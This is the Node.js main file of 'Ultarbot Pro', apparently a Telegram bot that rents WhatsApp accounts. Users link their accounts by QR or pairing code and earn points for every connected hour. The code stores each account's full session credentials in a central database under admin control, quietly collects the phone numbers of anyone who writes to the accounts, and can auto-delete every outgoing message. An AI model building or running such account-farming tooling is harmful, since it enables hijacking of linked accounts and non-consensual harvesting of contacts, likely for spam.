import 'dotenv/config';
import { 
    useMultiFileAuthState, 
    makeWASocket, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    Browsers,
    jidNormalizedUser,
    makeCacheableSignalKeyStore
} from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import pino from 'pino';
import express from 'express';
import { Boom } from '@hapi/boom';

import { setupTelegramCommands } from './telegram_commands.js';
import { 
    initDb, saveSessionToDb, getAllSessions, deleteSessionFromDb, addNumbersToDb, 
    getShortId, saveShortId, deleteShortId, addPoints, updateConnectionTime
} from './db.js';

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const NOTIFICATION_TOKEN = process.env.NOTIFICATION_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;
const SESSIONS_DIR = './sessions';

if (!TELEGRAM_TOKEN || !NOTIFICATION_TOKEN || !ADMIN_ID) { console.error('Missing Tokens'); process.exit(1); }

const app = express();
const PORT = process.env.PORT || 10000;
app.get('/', (req, res) => res.send('Ultarbot Pro Running'));
app.listen(PORT, () => console.log(`Server on ${PORT}`));

const mainBot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const notificationBot = new TelegramBot(NOTIFICATION_TOKEN, { polling: false });

const clients = {}; 
const shortIdMap = {}; 
const antiMsgState = {}; 
const autoSaveState = {}; 
const notificationCache = {};

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

function generateShortId() { return Math.random().toString(36).substring(2, 7); }
function makeSessionId() { return `Ultarbot_${Date.now()}`; }
const getRandomBrowser = () => Browsers.macOS('Chrome');

async function updateAdminNotification(message) {
    try { await notificationBot.sendMessage(ADMIN_ID, message, { parse_mode: 'Markdown' }); } catch (e) {}
}

// POINTS LOOP
setInterval(async () => {
    const sessions = await getAllSessions();
    for (const session of sessions) {
        if (clients[session.session_id] && session.telegram_user_id) {
            await addPoints(session.telegram_user_id, 10, 'TASK');
        }
    }
}, 3600000);

async function startClient(folder, targetNumber = null, chatId = null, telegramUserId = null) {
    const sessionPath = path.join(SESSIONS_DIR, folder);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: getRandomBrowser(), 
        version,
        connectTimeoutMs: 60000,
        markOnlineOnConnect: true,
        syncFullHistory: false
    });

    sock.ev.on('creds.update', saveCreds);

    // Handle QR code for authentication
    sock.ev.on('connection.update', async (update) => {
        const { qr } = update;
        
        if (qr && chatId) {
            try {
                // Import qrcode module for QR generation
                const QRCode = (await import('qrcode')).default;
                const qrImage = await QRCode.toBuffer(qr, { errorCorrectionLevel: 'H', type: 'image/png', width: 300 });
                
                mainBot.sendPhoto(chatId, qrImage, {
                    caption: '[QR CODE]\n\nScan this QR code with your WhatsApp camera to connect.',
                    parse_mode: 'Markdown'
                }).catch(err => console.error('Failed to send QR:', err.message));
            } catch (e) {
                console.error('QR generation error:', e.message);
                mainBot.sendMessage(chatId, '[QR CODE]\n\nPlease scan the QR code on your WhatsApp app.\n\nWaiting for connection...').catch(() => {});
            }
        }
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg || !msg.message) return;

        // 1. INSTANT SPEED CHECK - ANTIMSG (OPTIMIZED)
        if (msg.key.fromMe && !msg.message.protocolMessage) {
            // Only check ID map if it is from Me
            const myShortId = Object.keys(shortIdMap).find(k => shortIdMap[k].folder === folder);
            
            if (myShortId && antiMsgState[myShortId]) {
                const remoteJid = msg.key.remoteJid;
                const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
                
                // Exclusion Check (Don't delete my commands or Status)
                if (remoteJid !== 'status@broadcast' && !text.startsWith('.')) {
                    // 🔥 FIRE AND FORGET: DELETE IMMEDIATELY (NO AWAIT)
                    sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {});
                    
                    // Log in background
                    const target = remoteJid.split('@')[0];
                    const now = Date.now();
                    if (now - (notificationCache[target] || 0) > 20000) {
                        updateAdminNotification(`[ANTIMSG] Deleted from ID: ${myShortId} to +${target}`);
                        notificationCache[target] = now;
                    }
                    return; // Stop processing to save speed
                }
            }
        }

        // 2. Incoming Messages Logic
        if (!msg.key.fromMe) {
            const myShortId = Object.keys(shortIdMap).find(k => shortIdMap[k].folder === folder);
            if (!myShortId) return;

            const remoteJid = msg.key.remoteJid;
            
            // AutoSave
            if (autoSaveState[myShortId]) {
                if (remoteJid.endsWith('@s.whatsapp.net')) {
                    await addNumbersToDb([remoteJid.split('@')[0]]);
                }
            }

            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
            if (text.toLowerCase() === '.alive') {
                await sock.sendMessage(remoteJid, { text: 'Ultarbot Pro [ONLINE]' }, { quoted: msg });
            }
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            const userJid = jidNormalizedUser(sock.user.id);
            const phoneNumber = userJid.split('@')[0];
            
            let myShortId = await getShortId(folder);
            if (!myShortId) {
                myShortId = generateShortId();
                await saveShortId(folder, myShortId);
                await updateConnectionTime(folder);
            }
            
            shortIdMap[myShortId] = { folder, phone: phoneNumber, chatId: telegramUserId };
            clients[folder] = sock;

            const credsFile = path.join(sessionPath, 'creds.json');
            const content = fs.existsSync(credsFile) ? fs.readFileSync(credsFile, 'utf-8') : '';
            const antimsg = antiMsgState[myShortId] || false;
            const autosave = autoSaveState[myShortId] || false;
            
            await saveSessionToDb(folder, phoneNumber, content, telegramUserId || 'admin', antimsg, autosave);
            updateAdminNotification(`[CONNECTED] +${phoneNumber} (ID: ${myShortId})`);

            if (chatId) mainBot.sendMessage(chatId, `[CONNECTED]\nID: ${myShortId}`, { parse_mode: 'Markdown' });
        }

        if (connection === 'close') {
            let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            if (reason === 403 || reason === DisconnectReason.loggedOut) {
                updateAdminNotification(`[BANNED/LOGGED OUT] +${shortIdMap[folder]?.phone || 'Unknown'}`);
                await deleteSessionFromDb(folder);
                deleteShortId(folder);
                if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
                delete clients[folder];
            } else {
                startClient(folder, null, chatId, telegramUserId);
            }
        }
    });

    if (targetNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(targetNumber);
                if (chatId) mainBot.sendMessage(chatId, `Code: \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) {}
        }, 3000);
    }
}

async function boot() {
    await initDb(); 
    const savedSessions = await getAllSessions(null);
    console.log(`[DB] Restoring ${savedSessions.length} sessions...`);
    
    for (const session of savedSessions) {
        const folderPath = path.join(SESSIONS_DIR, session.session_id);
        if (!fs.existsSync(folderPath)) fs.mkdirSync(folderPath, { recursive: true });
        if (session.creds) fs.writeFileSync(path.join(folderPath, 'creds.json'), session.creds);
        
        let shortId = await getShortId(session.session_id);
        if (!shortId) { shortId = generateShortId(); await saveShortId(session.session_id, shortId); }

        shortIdMap[shortId] = { folder: session.session_id, phone: session.phone, chatId: session.telegram_user_id };
        
        if (session.antimsg) antiMsgState[shortId] = true;
        if (session.autosave) autoSaveState[shortId] = true; 

        startClient(session.session_id, null, null, session.telegram_user_id);
    }
}

setupTelegramCommands(mainBot, notificationBot, clients, shortIdMap, antiMsgState, startClient, makeSessionId);
boot();
